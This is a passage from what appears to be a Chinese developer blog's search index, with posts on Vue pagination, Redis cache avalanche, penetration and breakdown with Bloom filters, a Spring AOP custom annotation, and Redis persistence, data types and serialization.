100);</span><br></pre></td></tr></table></figure></p><p>前端部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">      &lt;&#x2F;el-table&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;pagination&quot;&gt;</span><br><span class="line">        &lt;el-pagination</span><br><span class="line">          @size-change&#x3D;&quot;handleSizeChange&quot;</span><br><span class="line">          @current-change&#x3D;&quot;handleCurrentChange&quot;</span><br><span class="line">          :current-page&#x3D;&quot;page.current&quot;</span><br><span class="line">          :page-sizes&#x3D;&quot;[100, 500, 1000]&quot;</span><br><span class="line">          :page-size&#x3D;&quot;page.size&quot;</span><br><span class="line">          layout&#x3D;&quot;total, sizes, prev, pager, next, jumper&quot;</span><br><span class="line">          :total&#x3D;&quot;pageTotal&quot;</span><br><span class="line">        &gt;</span><br><span class="line">        &lt;&#x2F;el-pagination&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data() &#123;</span><br><span class="line">  return &#123;</span><br><span class="line">        records: [],</span><br><span class="line">        pageTotal: null,</span><br><span class="line">        total: null,</span><br><span class="line">        page: &#123;</span><br><span class="line">          size: 100,</span><br><span class="line">          current: 1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">methods: &#123;</span><br><span class="line">    handleCurrentChange(newPage) &#123;</span><br><span class="line">    console.log(newPage)</span><br><span class="line">    this.page.current &#x3D; newPage</span><br><span class="line">    this.likeSearch()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    likeSearch() &#123;</span><br><span class="line">    this.$axios</span><br><span class="line">      .post(&#39;&#x2F;xxxxx, &#123;</span><br><span class="line">        frontParamVo: this.frontParamVo,</span><br><span class="line">        current: this.page.current,</span><br><span class="line">        size: this.page.size,</span><br><span class="line">        dataType: &#39;json&#39;,</span><br><span class="line">        headers: &#123;</span><br><span class="line">          &#39;Content-Type&#39;: &#39;application&#x2F;json;charset&#x3D;UTF-8&#39;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      .then(res &#x3D;&gt; &#123;</span><br><span class="line">        res &#x3D; res.data</span><br><span class="line">        this.records &#x3D; []</span><br><span class="line">        this.records &#x3D; res.records</span><br><span class="line">        this.pageTotal &#x3D; res.total</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch(error &#x3D;&gt; &#123;</span><br><span class="line">        console.log(error)</span><br><span class="line">      &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
            <tag> mybatis-plus </tag>
            
            <tag> element-ui </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis缓存雪崩、缓存穿透、缓存击穿与布隆过滤器</title>
      <link href="/2020/11/02/redis%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/"/>
      <url>/2020/11/02/redis%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>redis作为基于内存的非关系型数据库，通过读取缓存有效降低了大数据量访问系统(如购物商城网站)导致的数据库大量的磁盘读写操作，减少了数据库瘫痪、服务器宕机的风险。但是引入redis后也可能会产生新的问题导致redis缓存失效，大量数据访问依旧直接落在数据库上导致数据库瘫痪。本文主要介绍redis缓存雪崩、缓存穿透、缓存击穿与他们的解决方案。</p><h2 id="redis常见问题"><a href="#redis常见问题" class="headerlink" title="redis常见问题"></a>redis常见问题</h2><h3 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h3><p>我们知道redis存储的数据大部分会设置过期时间这就导致有可能大量数据过期时间相近使得某时段大量缓存失效，又或者redis集群(即多台执行相同redis缓存服务的服务器群)宕机、重启导致服务器服务失效无缓存可用。想象一下，redis集群是高山积雪底层的雪堆，发生上述两大类问题后就如同积雪的底层不再起支持作用，大量的数据访问如雪崩一样冲向山下的数据库，这无疑让数据库离瘫痪、服务器宕机不远了。下图为避免雪崩的数据访问流程图。<br><img src="/img/Redis/雪崩.png" alt="避免缓存雪崩的系统设计访问流程图"> </p><p>解决方案：</p><ol><li><p>设计上使用加锁或者队列的方式保证来保证不会有大量的线程对数据库一次性进行读写，从而避免失效时大量的并发请求落到底层存储系统上。<br>注意：加锁排队只是为了减轻数据库的压力，并没有提高系统吞吐量。假设在高并发下，缓存重建期间key是锁着的，这是过来1000个请求999个都在阻塞的。同样会导致用户等待超时</p></li><li><p>缓存失效时间分散开，比如我们可以在原有的失效时间基础上增加一个随机值，比如1-5分钟随机，这样每一个缓存的过期时间的重复率就会降低，就很难引发集体失效的事件。</p></li></ol><p>雪崩处理：</p><p>发生前：尽量保证整个 redis 集群的⾼可⽤性，发现机器宕机尽快补上。选择合适的内存淘汰策<br>略。降低失效时间重复率。</p><p>发生中：错峰限流降低对数据库的访问量，避免数据库瘫痪。</p><p>发生后：使用redis持久化策略RDB(快照)、AOF(文件追加)的文件尽快进行缓存恢复。</p><h3 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h3><p>缓存穿透说简单点就是⼤量请求的key根本不存在于缓存中,导致请求直接到了数据库上，根本没有经过缓存这⼀层。举个例⼦：某个⿊客故意制造我们缓存中不存在的key发起⼤量请求，导致⼤量请求落到数据库。下图分别为正常读取缓存流程、缓存中不存在该key直接访问数据库、设置布隆过滤器过滤非法key的流程。<br><img src="/img/Redis/穿透1.png" alt="正常读取缓存流程"><br><img src="/img/Redis/穿透2.png" alt="缓存中不存在该key直接访问数据库"><br><img src="/img/Redis/穿透3.png" alt="设置布隆过滤器过滤非法key"><br>解决方案：</p><ol><li><p>上线前做好基本的参数校验，⼀些不合法的参数请求直接抛出异常信息返回给客户端。⽐如查询的数据库id不能⼩于0、传⼊的邮箱格式不对的时候直接返回错误消息给客户端等等。</p></li><li><p>请求redis读取缓存前添加布隆过滤器过滤非法的key,布隆过滤器可用判断该数据在数据库中是否存在从而避免非法和不存在的key去访问我们的数据库。下文详细介绍布隆过滤器。</p></li><li><p>设置缓存⽆效 key : 如果缓存和数据库都查不到某个 key 的数据就写⼀个key到 redis 中去并设置过期时间。这种⽅式可以解决请求的 key 变化不频繁的情况，如果⿊客恶意攻击，每次构建不同的请求key，会导致redis中缓存⼤量⽆效的key。很明显，这种⽅案并不能从根本上解决此问题。如果⾮要⽤这种⽅式来解决穿透问题的话，尽量将⽆效的 key的过期时间设置短⼀点⽐如 1 分钟。</p></li></ol><h3 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a>缓存击穿</h3><p>缓存雪崩和缓存穿透都理解的话，缓存击穿可以说是非常简单了。缓存击穿聚焦于热点的key数据，大并发集中对这些点进行访问，当这些热点数据发生过期失效可想而知持续的大并发就穿破缓存，直接请求数据库，就像在一个屏障上凿开了一个洞。举个例子：电商网站上某个商品是爆款，一群用户访问这个商品信息结果这个商品信息的key在缓存中失效了，然后数据库就崩了，大家就都买不成了跑别的解决击穿问题的商城网站去买了。击穿的流程图可看上文缓存穿透流程图中缓存中不存在该key直接访问数据库的流程图。</p><p>解决方案：</p><ol><li><p>业界比较常用的做法，是使用mutex。简单地来说，就是在缓存失效的时候（判断拿出来的值为空），不是立即去load db，而是先使用缓存工具的某些带成功操作返回值的操作（比如Redis的SETNX或者Memcache的ADD）去set一个mutex key，当操作返回成功时，再进行load db的操作并回设缓存；否则，就重试整个get缓存的方法。<br>SETNX，是「SET if Not eXists」的缩写，也就是只有不存在的时候才设置，可以利用它来实现锁的效果。</p></li><li><p>将热点数据的key直接设置过期时间特别长或永不过期自然解决，但注意这中不过期的key数据维护。</p></li></ol><h2 id="布隆过滤器"><a href="#布隆过滤器" class="headerlink" title="布隆过滤器"></a>布隆过滤器</h2><p>布隆过滤器（Bloom Filter）是一个数据结构，由布隆（Burton Howard Bloom）于1970年提出的。它实际上是一个很长的二进制向量和一系列随机映射函数。<br>通俗的讲，布隆过滤器原理是将数据经过多次散列函数(几次取决于你的系统设置中对误差率的要求)将对应的二进制向量下标位置进行变1标注，当数据进入布隆过滤器根据散列函数散列后的下标便可以确认该数据是否存在。可以参考java中hashset判重与hascode()原理。<br>布隆过滤器误差：布隆过滤器不能完美的判断数据是否存在，举个例子说明：假设有个数组长度为8，值默认都是0，布隆过滤器放入2个数后，下标分别为0135、1246的值全变为了1，放入第3个数时，发现这个数经过多次散列函数后该标记的下标分别为0346，由于这些下标全部被标记为1布隆过滤器就会误以为该数已经存在不再更新下标值。</p>]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring AOP自定义注解</title>
      <link href="/2020/10/07/AOP%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/"/>
      <url>/2020/10/07/AOP%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="自定义注解类"><a href="#自定义注解类" class="headerlink" title="自定义注解类"></a>自定义注解类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Target</span>(value = &#123;ElementType.TYPE, ElementType.METHOD&#125;)<span class="comment">//使用位置（类，方法）</span></span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)<span class="comment">//加载到jvm里运行</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyAspect &#123;</span><br><span class="line">    <span class="function">String <span class="title">value</span><span class="params">()</span></span>; <span class="comment">//注解的属性，如果只有一个属性，一般叫value</span></span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">()</span> <span class="keyword">default</span> ""</span>; <span class="comment">//属性，默认值""，可以不写</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="切面类"><a href="#切面类" class="headerlink" title="切面类"></a>切面类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.aspectj.lang.JoinPoint;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.AfterReturning;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Aspect;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Before;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Pointcut;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Aspect</span><span class="comment">//来定义一个切面</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAspectAop</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义切入点</span></span><br><span class="line">    <span class="meta">@Pointcut</span>(<span class="string">"@annotation(com....MyAspect)"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">auditAspect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通知</span></span><br><span class="line">    <span class="meta">@Before</span>(<span class="string">"auditAspect()"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doBefore</span><span class="params">(JoinPoint joinPoint)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"触发到 @Before(\"auditAspect()\")"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 后置通知  <span class="doctag">@Around</span>环绕处理</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> joinPoint 切点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@AfterReturning</span>(<span class="string">"auditAspect()"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doAfrterReturning</span><span class="params">(JoinPoint joinPoint)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Object[] args = joinPoint.getArgs();</span><br><span class="line">        System.out.println(<span class="string">"触发 @AfterReturning(\"auditAspect()\")"</span>);</span><br><span class="line">        System.out.println(args.length);</span><br><span class="line">        getControllerMethodDescription(joinPoint);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取注解中对方法的描述信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> joinPoint 切点</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 方法描述</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getControllerMethodDescription</span><span class="params">(JoinPoint joinPoint)</span> </span>&#123;</span><br><span class="line">        String targetName = joinPoint.getTarget().getClass().getName();    <span class="comment">//获得执行方法的类名</span></span><br><span class="line">        String methodName = joinPoint.getSignature().getName();            <span class="comment">//获得执行方法的方法名</span></span><br><span class="line">        Object[] arguments = joinPoint.getArgs();                          <span class="comment">//获取切点方法的所有参数类型</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class targetClass = Class.forName(targetName);</span><br><span class="line"></span><br><span class="line">            Method[] methods = targetClass.getMethods();    <span class="comment">//获取公共方法，不包括类私有的</span></span><br><span class="line">            String value = <span class="string">""</span>;</span><br><span class="line">            String name = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(methodName)) &#123;</span><br><span class="line">                    Class[] clazzs = method.getParameterTypes();     <span class="comment">//对比方法中参数的个数</span></span><br><span class="line">                    <span class="keyword">if</span> (clazzs.length == arguments.length) &#123;</span><br><span class="line">                        value = method.getAnnotation(MyAspect<span class="class">.<span class="keyword">class</span>).<span class="title">value</span>()</span>;</span><br><span class="line">                        name = method.getAnnotation(MyAspect<span class="class">.<span class="keyword">class</span>).<span class="title">name</span>()</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">"value="</span> + value);</span><br><span class="line">            System.out.println(<span class="string">"name="</span> + name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注解使用"><a href="#注解使用" class="headerlink" title="注解使用"></a>注解使用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试自定义注解</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@MyAspect</span>(value = <span class="string">"MyAspect"</span>, name = <span class="string">"name"</span>)</span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/add"</span>, method = RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获取本服务的信息</span></span><br><span class="line">        ServiceInstance instance = client.getLocalServiceInstance();</span><br><span class="line">        Integer r = <span class="number">2</span>;</span><br><span class="line">        String info = <span class="string">"/add, host:"</span> + instance.getHost() + <span class="string">", service_id:"</span> + instance.getServiceId() + <span class="string">"结果："</span> + r;</span><br><span class="line">        logger.info(info);</span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">触发到 @Before(&quot;auditAspect()&quot;)</span><br><span class="line">2018-09-13 20:11:07.554  INFO 14012 --- [nio-9003-exec-1] c.c.s.c.ComputeController@7fcff1b9       : &#x2F;add, host:localhost, service_id:MyAspect-service结果：2</span><br><span class="line">触发 @AfterReturning(&quot;auditAspect()&quot;)</span><br><span class="line">0</span><br><span class="line">value&#x3D;MyAspect</span><br><span class="line">name&#x3D;name</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Spring </tag>
            
            <tag> AOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis基础认识</title>
      <link href="/2020/09/08/redis%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%86/"/>
      <url>/2020/09/08/redis%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Redis属于NOSQL((NoSQL = Not Only SQL )，意即“不仅仅是SQL”。NoSQL 数据库种类繁多(Redis、Mongodb、HBase、Elasticsearch 等等)),NOSQL的特点是去掉关系数据库的关系型特性。数据之间无关系，这样就非常容易扩展。无形之间也在架构的层面上带来了可扩展的能力。NoSQL数据库都具有非常高的读写性能，尤其在大量下数据，更能体现它的优势。这得益于它的无关系性，数据库的结构简单。</p><p>Redis本质上是一个Key-Value类型的内存数据库，很像memcached，整个数据库在内存当中进行操作，定期通过异步操作把数据库数据写到硬盘上进行保存。因为是纯内存操作，Redis的性能非常出色，每秒可以处理超过 10万次读写操作，是已知性能最快的Key- Value DB。 Redis的出色之处不仅仅是性能，Redis最大的魅力是支持保存多种数据结构，此外单个value的最大限制是1GB，不像memcached只能保存1MB的数据，因此Redis可以用来实现很多有用的功能。默认16个数据库，类似数组下标是从零开始，初始默认使用零号库，统一的密码管理，16个库都是同样密码，要么都连上要么一个也连接不上，redis默认端口是6379。</p><p>在 Redis 中，事务总是具有原子性 （Atomicity)、一致性(Consistency)和隔离性（Isolation），并且当 Redis 运行在某种特定的持久化模式下时(快照、文件追加)，事务也具有持久性（Durability）。 </p><p>快照（snapshotting）持久化（RDB） Redis可以通过创建快照来获得存储在内存里面的数据在某个时间点上的副本。Redis创建快照之后，可以对快照进行 备份，可以将快照复制到其他服务器从而创建具有相同数据的服务器副本（Redis主从结构，主要用来提高Redis性 能），还可以将快照留在原地以便重启服务器的时候使用。<br>快照实例配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">save 900 1              #在900秒(15分钟)之后，如果至少有1个key发生变化，Redis就会自动触发BGSAVE命令 创建快照。</span><br></pre></td></tr></table></figure></p><p>AOF（append-only ﬁle）持久化 与快照持久化相比，AOF持久化 的实时性更好，因此已成为主流的持久化方案。默认情况下Redis没有开启 AOF（append only ﬁle）方式的持久化，可以通过appendonly参数开启：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">appendonly yes</span><br></pre></td></tr></table></figure><br>开启AOF持久化后每执行一条会更改Redis中的数据的命令，Redis就会将该命令写入硬盘中的AOF文件。AOF文件的 保存位置和RDB文件的位置相同，都是通过dir参数设置的，默认的文件名是appendonly.aof。<br>在Redis的配置文件中存在三种不同的 AOF 持久化方式，它们分别是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">appendfsync always     <span class="comment">#每次有数据修改发生时都会写入AOF文件,这样会严重降低Redis的速度 </span></span><br><span class="line">appendfsync everysec  <span class="comment">#每秒钟同步一次，显示地将多个写命令同步到硬盘 </span></span><br><span class="line">appendfsync no      <span class="comment">#让操作系统决定何时进行同步</span></span><br></pre></td></tr></table></figure><br>为了兼顾数据和写入性能，用户可以考虑 appendfsync everysec选项 ，让Redis每秒同步一次AOF文件，Redis性能 几乎没受到任何影响。而且这样即使出现系统崩溃，用户多只会丢失一秒之内产生的数据。当硬盘忙于执行写入操 作的时候，Redis还会优雅的放慢自己的速度以便适应硬盘的大写入速度</p><p>redis的优点：<br>速度快：因为数据存在内存中，类似于HashMap，HashMap的优势就是查找和操作的时间复杂度都是O(1) 持久化：定期通过异步操作把数据库数据写到硬盘上进行保存<br>支持丰富数据类型：支持string，list，set，sorted   set，hash<br>支持事务：操作都是原子性，所谓的原子性就是对数据的更改要么全部执行，要么全部不执行丰富的特性：可用于缓存，消息，按key设置过期时间，过期后将会自动删除</p><p>redis支持类型详细：</p><ol><li><p>String<br>常用命令: set,get,decr,incr,mget 等。 String数据结构是简单的key-value类型，value其实不仅可以是String，也可以是数字。 常规key-value缓存应用； 常规计数：微博数，粉丝数等。 </p></li><li><p>Hash<br>常用命令： hget,hset,hgetall 等。<br>Hash 是一个 string 类型的 ﬁeld 和 value 的映射表，hash 特别适合用于存储对象，后续操作的时候，你可以直接仅 仅修改这个对象中的某个字段的值。 比如我们可以Hash数据结构来存储用户信息，商品信息等等。比如下面我就用 hash 类型存放了我本人的一些信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key=JavaUser293847</span><br><span class="line">value=&#123;  </span><br><span class="line">“id”: 1,</span><br><span class="line">“name”: “SnailClimb”,  </span><br><span class="line">“age”: 22,  </span><br><span class="line">“location”: “Wuhan, Hubei”</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li><li><p>List<br>常用命令: lpush,rpush,lpop,rpop,lrange等<br>list 就是链表，Redis list 的应用场景非常多，也是Redis重要的数据结构之一，比如微博的关注列表，粉丝列表， 消息列表等功能都可以用Redis的 list 结构来实现。 Redis list 的实现为一个双向链表，即可以支持反向查找和遍历，更方便操作，不过带来了部分额外的内存开销。<br>另外可以通过 lrange 命令，就是从某个元素开始读取多少个元素，可以基于 list 实现分页查询，这个很棒的一个功能，基于 redis 实现简单的高性能分页，可以做类似微博那种下拉不断分页的东西（一页一页的往下走），性能高。 </p></li><li><p>Set<br>常用命令： sadd,spop,smembers,sunion 等 set 对外提供的功能与list类似是一个列表的功能，特殊之处在于 set 是可以自动排重的。<br>当你需要存储一个列表数据，又不希望出现重复数据时，set是一个很好的选择，并且set提供了判断某个成员是否在 一个set集合内的重要接口，这个也是list所不能提供的。可以基于 set 轻易实现交集、并集、差集的操作。 比如：在微博应用中，可以将一个用户所有的关注人存在一个集合中，将其所有粉丝存在一个集合。Redis可以非常 方便的实现如共同关注、共同粉丝、共同喜好等功能。这个过程也就是求交集的过程。</p></li><li><p>Sorted Set<br>常用命令： zadd,zrange,zrem,zcard等 和set相比，sorted set增加了一个权重参数score，使得集合中的元素能够按score进行有序排列。<br>举例： 在直播系统中，实时排行信息包含直播间在线用户列表，各种礼物排行榜，弹幕消息（可以理解为按消息维 度的消息排行榜）等信息，适合使用 Redis 中的 SortedSet 结构进行存储。</p></li></ol><h2 id="缓存雪崩和缓存穿透问题解决方案"><a href="#缓存雪崩和缓存穿透问题解决方案" class="headerlink" title="缓存雪崩和缓存穿透问题解决方案"></a>缓存雪崩和缓存穿透问题解决方案</h2><p>缓存雪崩<br>简介：缓存同一时间大面积的失效，所以，后面的请求都会落到数据库上，造成数据库短时间内承受大量请求而崩 掉。<br>解决办法（中华石杉老师在他的视频中提到过，视频地址在后一个问题中有提到）：<br>事前：尽量保证整个 redis 集群的高可用性，发现机器宕机尽快补上。选择合适的内存淘汰策略。 事中：本地ehcache缓存 + hystrix限流&amp;降级，避免MySQL崩掉 事后：利用 redis 持久化机制保存的数据尽快恢复缓存</p><p>缓存穿透<br>简介：一般是黑客故意去请求缓存中不存在的数据，导致所有的请求都落到数据库上，造成数据库短时间内承受大量 请求而崩掉。<br>解决办法： 有很多种方法可以有效地解决缓存穿透问题，常见的则是采用布隆过滤器，将所有可能存在的数据哈 希到一个足够大的bitmap中，一个一定不存在的数据会被 这个bitmap拦截掉，从而避免了对底层存储系统的查询压 力。另外也有一个更为简单粗暴的方法，如果一个查询返回的数据为空（不管是数据不存在，还是系统故障），我们仍然把这个空结果进行缓存，但它的过期时间会很短，长不超过五分钟。</p><h2 id="Redis序列化"><a href="#Redis序列化" class="headerlink" title="Redis序列化"></a>Redis序列化</h2><p>针对数据的“序列化/反序列化”，springboot提供了多种可选择策略(RedisSerializer) :<br>JdkSerializationRedisSerializer：这个序列化方法就是Jdk提供的了。首先要求我们要被序列化的类继承自Serializeable<br>接口，然后通过，然后通过Jdk对象序列化的方法保存。（注：这个序列化保存的对象，即使是个String类型的，在redis<br>控制台，也是看不出来的，因为它保存了一些对象的类型什么的额外信息）。是目前最常用的序列化策略。</p><p>StringRedisSerializer：就是通过String.getBytes()来实现的。而且在Redis中，所有存储的值都是字符串类型的。所以这种方法保存后，通过Redis-cli控制台，是可以清楚的查看到我们保存了什么key,value是什么。是最轻量级和高效的策<br>略。</p><p>JacksonJsonRedisSerializer：jackson-json工具提供了javabean与json之间的转换能力，可以将pojo实例序列化成json 格式存储在redis中，也可以将json格式的数据转换成pojo实例。因为jackson工具在序列化和反序列化时，需要明确指定Class类型，因此策略封装起来稍微复杂。</p><p>spring boot导入redis依赖后，spring boot启动后会像spring 